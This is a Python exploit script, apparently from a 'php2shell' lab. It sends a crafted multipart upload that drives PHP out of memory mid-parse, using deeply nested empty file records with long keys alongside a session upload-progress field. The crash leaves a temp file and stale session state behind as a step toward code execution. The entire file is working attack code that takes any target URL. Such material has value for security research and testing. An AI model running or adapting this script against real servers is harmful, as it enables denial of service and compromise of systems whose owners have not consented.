#!/usr/bin/env python3
"""php2shell lab: demonstrate the OOM-during-multipart-parse primitive (calif variant).

Request A: session id + PHP_SESSION_UPLOAD_PROGRESS + one real file (spooled to disk)
           + hundreds of nested empty-upload records (filename="") that inflate
           $_FILES structures past memory_limit while body stays under post_max_size.
           Parsing fatals mid-request -> cleanup skipped -> temp file left behind,
           worker survives with stale session state.

Usage: python3 oom_primitive.py <url> [ndepth] [nparts]
"""
import socket
import sys
import time

SID = "ca1fb2e2d3e4f5a6b7c8d9e0f1a2b3c4"


def part(b: bytes, name: str, body: bytes, filename=None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + b + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build(ndepth=25, nparts=400):
    b = b"OomPrim618"
    body = b""
    body += part(b, "PHPSESSID", SID.encode()) + b"\r\n"
    body += part(b, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    # real file part: spooled to /tmp as phpXXXXXX before the OOM hits
    body += part(b, "realfile", b"LEAKME-" + b"Z" * 2048, filename="evidence.txt") + b"\r\n"
    # OOM inflator: nested empty-upload records -> many HashTables each.
    # Unique path per record (f[i][a][a]...) so nothing is reused; each record
    # builds 6 hierarchies (one per $_FILES key) x ndepth HashTables.
    filler_parts = []
    KEY = "a" * 400  # long keys fatten every HashTable bucket+zend_string
    for i in range(nparts):
        name = f"f[{i}]" + "".join(f"[{KEY}]" for _ in range(ndepth))
        filler_parts.append(part(b, name, b"", filename="") + b"\r\n")
    body += b"".join(filler_parts)
    body += b"--" + b + b"--\r\n"
    head = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: lab\r\n"
        f"User-Agent: oom-primitive\r\n"
        f"Cookie: PHPSESSID={SID}\r\n"
        f"Content-Type: multipart/form-data; boundary={b.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return head, body


def main():
    url = sys.argv[1]
    ndepth = int(sys.argv[2]) if len(sys.argv) > 2 else 25
    nparts = int(sys.argv[3]) if len(sys.argv) > 3 else 400
    from urllib.parse import urlparse
    u = urlparse(url)
    host, port = u.hostname, u.port or 80
    head, body = build(ndepth, nparts)
    print(f"request: depth={ndepth} parts={nparts} body={len(body)} bytes")
    s = socket.create_connection((host, port), timeout=30)
    s.sendall(head)
    s.sendall(body)
    s.settimeout(20)
    chunks = []
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            chunks.append(d)
    except socket.timeout:
        pass
    s.close()
    resp = b"".join(chunks)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO-RESPONSE (connection died)"
    print("status:", status)
    print("body head:", resp.split(b"\r\n\r\n", 1)[-1][:120])


if __name__ == "__main__":
    main()
